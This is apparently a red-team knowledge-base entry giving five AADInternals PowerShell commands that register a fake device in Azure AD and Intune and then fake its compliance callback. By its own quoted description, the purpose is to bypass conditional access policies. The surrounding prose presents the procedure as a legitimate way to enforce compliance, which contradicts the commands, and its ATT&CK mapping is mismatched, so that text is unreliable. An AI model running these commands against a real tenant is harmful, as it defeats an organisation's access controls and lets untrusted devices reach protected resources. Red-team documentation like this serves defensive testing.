---
id: 617b2881-fb86-4360-a81d-ab22edb0e050
name: Azure Conditional Access Device Joining
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:15.991376+00:00'
updated_at: '2023-04-10T20:19:35.318706+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Cloud Service Dashboard|T1538 - Cloud Service Dashboard]]'
tags:
- '[[Cloud - Azure]]'
- '[[Conditional Access]]'
commands:
- '[[Get access token for AAD join and save to cache]]'
- '[[Get access token for Intune MDM and save to cache]]'
- '[[Join device to Azure AD]]'
- '[[Join device to Intune]]'
- '[[Start the call back]]'
---

# Azure Conditional Access Device Joining

## Summary

The Azure Conditional Access Device Joining procedure is used to ensure that devices joining Azure AD and Intune are compliant with organizational policies. This procedure involves joining a device to Azure AD and Intune, which allows for the enforcement of compliance policies and conditional acces

## Description

# Description

The Azure Conditional Access Device Joining procedure is used to ensure that devices joining Azure AD and Intune are compliant with organizational policies. This procedure involves joining a device to Azure AD and Intune, which allows for the enforcement of compliance policies and conditional access policies. This procedure is essential for maintaining a secure and compliant environment, as it ensures that only trusted and compliant devices can access organizational resources. 

From a technical perspective, this procedure involves configuring Azure AD and Intune to require compliance policies for devices joining the environment. This is done by setting up conditional access policies that require compliance policies for devices to access organizational resources. This procedure can be used to enforce policies such as requiring devices to have a password, encryption, and up-to-date software. 

The business value of this procedure is that it allows organizations to maintain a secure and compliant environment by ensuring that only trusted and compliant devices can access organizational resources. This helps to prevent data breaches and other security incidents that can result in financial losses, reputational damage, and legal liabilities.

 

## Requirements

1. Azure AD and Intune access

1. Authentication credentials with sufficient privileges

 

## Defense

1. Configure conditional access policies to require compliance policies for devices joining the environment

1. Ensure that devices are up-to-date with the latest software and security patches

1. Monitor device compliance status regularly to detect any non-compliant devices

 

## Objectives

1. Ensure that only trusted and compliant devices can access organizational resources

1. Enforce compliance policies for devices joining the environment

1. Prevent data breaches and other security incidents

 

# Instructions

1. To make your device compliant, follow these steps:
1. Get an access token for AAD join and save it to cache using the Get-AADIntAccessTokenForAADJoin command.
2. Join the device to Azure AD using the Join-AADIntDeviceToAzureAD command. Specify the device name, device type, and OS version.
3. Register the device to Intune using the Get-AADIntAccessTokenForIntuneMDM command. This will prompt for credentials. Save the access token to cache.
4. Join the device to Intune using the Join-AADIntDeviceToIntune command. Specify the device name.
5. Start the callback using the Start-AADIntDeviceIntuneCallback command. Specify the PfxFileName and device name.

 



**Code**: [[# AAD Internals - Making your device compliant
# G]]



> This set of commands is used to bypass conditional access policies by faking device compliance. The commands involve getting access tokens for AAD join and Intune MDM, joining the device to Azure AD and Intune, and starting a callback. The device is then marked as compliant and can access resources that require conditional access policies.



**Command** ([[Get access token for AAD join and save to cache]]):

```bash
Get-AADIntAccessTokenForAADJoin -SaveToCache
```





**Command** ([[Join device to Azure AD]]):

```bash
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
```





**Command** ([[Get access token for Intune MDM and save to cache]]):

```bash
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache
```





**Command** ([[Join device to Intune]]):

```bash
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
```





**Command** ([[Start the call back]]):

```bash
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Cloud Service Dashboard|T1538 - Cloud Service Dashboard]]

## Commands Used

- [[Get access token for AAD join and save to cache]]
- [[Get access token for Intune MDM and save to cache]]
- [[Join device to Azure AD]]
- [[Join device to Intune]]
- [[Start the call back]]

## Tags

- [[Cloud - Azure]]
- [[Conditional Access]]


